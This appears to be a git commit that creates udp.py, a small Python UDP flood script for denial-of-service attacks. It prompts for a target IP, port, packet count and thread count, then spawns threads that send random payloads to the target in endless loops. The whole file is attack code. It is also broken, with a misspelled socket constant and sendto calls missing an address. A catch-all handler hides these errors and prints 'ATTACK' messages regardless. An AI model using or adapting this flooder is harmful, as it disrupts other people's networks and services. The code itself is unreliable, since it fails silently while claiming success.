19417358d1a5ebac8e628d074e1377d024973ae0
felisa <93446622+Xalbador0@users.noreply.github.com>
2021-11-03 23:30:52 +0700

    Create udp.py

---
+++ udp.py
@@ -0,0 +1,31 @@
+#simpledosudp
+#codebyxalbador
+import socket
+import random
+import threading
+import os,sys
+
+print("UBAH SERAH KALIAN")
+
+ip_wibu = str(input("Ip Target : "))
+port_wibu = int(input("Port Target : "))
+paket_wibu = int(input("Paket Dari Wibu : "))
+threads_wibu = int(input("Thread Dari Wibu : "))
+os.system("clear")
+
+def wibu():
+    asu = random._urandom(1024)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
+            s.connect((ip_wibu,port_wibu))
+            s.sendto(asu)
+            for x in range(paket_wibu):
+                s.sendto(asu)
+            print("[•] WIBU ATTACK!!!")
+        except:
+            print("[•] WIBU ATTACK!!!")
+
+for y in range(threads_wibu):
+    th = threading.Thread(target=wibu)
+    th.start()
